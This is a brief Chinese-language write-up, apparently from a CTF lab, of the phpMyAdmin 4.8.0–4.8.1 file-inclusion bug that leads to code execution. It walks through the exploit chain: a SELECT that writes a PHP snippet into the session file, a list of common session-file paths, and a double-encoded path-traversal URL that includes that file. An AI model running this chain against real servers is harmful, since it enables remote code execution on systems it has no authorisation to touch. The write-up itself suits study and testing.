phpmyadmin 4.8.0-4.8.1任意文件包含转代码执行漏洞

首先执行

* [select](http://a1a36f9f-98a3-4fee-8569-9e36f1bfcf7b.node3.buuoj.cn/phpmyadmin/url.php?url=https://dev.mysql.com/doc/refman/5.5/en/select.html) "<?php phpinfo()?>" 
* 然后找到cookie中的session id
* 还暴露了phpinfo.php，访问找到其中的session保存位置，/var/lib/php/sessions/sess_PHPSESSID

* 其他常见的保存地址 
  * /var/lib/php/sessions/sess_PHPSESSID
  * /var/lib/php/sess_PHPSESSID
  * /tmp/sess_PHPSESSID
  * /tmp/sessions/sess_PHPSESSID

* 然后访问
  * index.php?target=db_sql.php%253f/../../../../../../../../../var/lib/php/sessions/sess_23usbf5cta4irltnq7607o6d5p
  * 即可执行代码